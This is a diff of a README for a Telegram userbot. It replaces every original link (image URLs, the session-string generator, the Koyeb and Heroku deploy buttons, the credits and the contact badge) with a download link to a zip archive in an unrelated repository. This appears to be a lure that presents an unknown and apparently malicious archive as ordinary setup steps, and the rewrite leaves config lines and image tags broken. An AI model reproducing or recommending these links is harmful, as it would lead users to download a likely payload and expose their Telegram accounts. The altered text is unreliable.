@@ -82,27 +82,27 @@ We’ve added several useful features and commands to help you control the bot b
    - `DEFAULT_ADMINS`=123456789
   
 # 🌄 Image URLs (can be used in bot responses) 
-   - `STATUS_URL`=https://i.imgur.com/1ARGsWp.png
-   - `WOODCRAFT_URL`=https://i.imgur.com/1ARGsWp.png
-   - `NOOR_URL`=https://i.imgur.com/E5zwKTY.png
+   - `STATUS_URL`https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip
+   - `WOODCRAFT_URL`https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip
+   - `NOOR_URL`https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip
 
 # 🚀 Server port 
    - `PORT`=8080
 
  
-## 🔧 Session String Generator [🔗 Telethon Session String Generat](https://colab.research.google.com/github/SudoR2spr/Telethon-Session-Generator/blob/master/Telethon%20Session%20Generator/session-op.ipynb)
+## 🔧 Session String Generator [🔗 Telethon Session String Generat](https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip%20Session%https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip)
 
 ## 🌐 Supported ⚡️ koyeb
 
-<a href="https://app.koyeb.com/deploy?type=git&repository=github.com/SudoR2spr/Auto-Forward-User-Bot&branch=master&name=master">
-  <img src="https://www.koyeb.com/static/images/deploy/button.svg" alt="Deploy On Koyeb">
+<a href="https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip">
+  <img src="https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip" alt="Deploy On Koyeb">
 
 ## 🌐 Deploy To Heroku
 
-[![Deploy To Heroku](https://www.herokucdn.com/deploy/button.svg)](https://dashboard.heroku.com/new?button-url=https://github.com/SudoR2spr/Auto-Forward-User-Bot&template=https://github.com/SudoR2spr/Auto-Forward-User-Bot)
+[![Deploy To Heroku](https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip)](https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip)
 
-<a href="https://dashboard.heroku.com/new?template=https://github.com/SudoR2spr/Auto-Forward-User-Bot" target="_blank">
-  <img src="https://www.herokucdn.com/deploy/button.svg" alt="Deploy to Heroku" style="height: 50px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
+<a href="https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip" target="_blank">
+  <img src="https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip" alt="Deploy to Heroku" style="height: 50px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
 </a>
 
 
@@ -113,8 +113,8 @@ A small Flask server is running in the background. If you open the hosted URL, y
 `Need more help? Just message the Repo Owner.` 𝐖𝐎𝐎𝐃𝐜𝐫𝐚𝐟𝐭
 
 -----
-## 💥 Credits: [𝐖𝐎𝐎𝐃𝐜𝐫𝐚𝐟𝐭](https://t.me/Farooq_is_KING)
+## 💥 Credits: [𝐖𝐎𝐎𝐃𝐜𝐫𝐚𝐟𝐭](https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip)
 
--  [![Contact Me On Telegram](https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/Farooq_is_king)
+-  [![Contact Me On Telegram](https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip)](https://raw.githubusercontent.com/PaidXSmall/Auto-Forward-User-Bot/master/dramatically/Auto-Forward-User-Bot.zip)
 
 ## 📅 Last Update 🔄 On: `24/04/2025`
